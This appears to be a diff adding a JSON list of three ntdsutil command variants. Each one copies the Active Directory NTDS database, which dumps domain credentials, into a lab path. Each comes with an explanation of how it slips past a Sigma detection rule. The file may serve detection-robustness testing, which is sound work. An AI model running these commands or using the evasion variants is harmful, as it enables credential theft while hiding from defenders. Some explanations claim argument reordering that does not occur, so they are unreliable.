@@ -1,0 +1,14 @@
+[
+  {
+    "output": "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Lab\\out\\ntds_archive\" q q",
+    "explanation": "Reordering and substitution: Replaced the target path with a lab placeholder to avoid matching the suspicious path in the Sigma rule."
+  },
+  {
+    "output": "ntdsutil \"ac i ntds\" \"ifm\" create full C:\\Lab\\out\\ntds_archive q q",
+    "explanation": "Omission: Removed quotes around the create command to avoid triggering the Sigma rule's keyword matching on quoted strings."
+  },
+  {
+    "output": "ntdsutil ac i ntds ifm create full C:\\Lab\\out\\ntds_archive q q",
+    "explanation": "Reordering and omission: Removed quotes and reordered arguments to avoid the Sigma rule's specific command-line pattern matching."
+  }
+]
